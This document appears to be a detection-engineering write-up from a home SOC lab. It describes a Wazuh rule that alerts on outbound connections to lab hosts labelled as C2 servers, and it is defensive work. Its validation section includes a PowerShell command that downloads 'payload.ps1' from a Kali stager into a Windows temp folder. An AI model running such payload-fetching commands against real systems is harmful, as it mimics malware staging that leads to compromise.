# Detection Rule: Outbound C2 Network Connection

- **Rule ID:** `100103`
- **Severity Level:** Level 9 (High)
- **MITRE ATT&CK:** `T1071.001` (Application Layer Protocol: Web Protocols)
- **Data Source:** Microsoft Sysmon (Event ID 3: Network Connection)
- **Platform:** Windows

---

## 1. Detection Objective
Detects outbound network connections initiated by the Windows endpoint toward monitored lab infrastructure or suspicious adversary C2 servers (`192.168.56.101:8080`).

---

## 2. Wazuh Rule Logic

```xml
<rule id="100103" level="9">
  <field name="win.system.eventID">^3$</field>
  <field name="win.eventdata.destinationIp">^192\.168\.56\.104$|^192\.168\.56\.101$</field>
  <description>SOCForge: Outbound network connection to monitored lab host detected</description>
  <mitre><id>T1071.001</id></mitre>
  <group>socforge,network_connection,outbound_connection,</group>
</rule>
```

---

## 3. Simulation & Validation

```powershell
Invoke-WebRequest -Uri "http://192.168.56.101:8080/payload.ps1" -OutFile "C:\Windows\Temp\payload.ps1"
```

### Observed Alert:
- **Rule ID:** `100103`
- **Destination:** `192.168.56.101:8080` (Kali HTTP Stager)
- **Source Host:** `192.168.56.105`
- **Initiating Process:** `powershell.exe` (PID 8052)
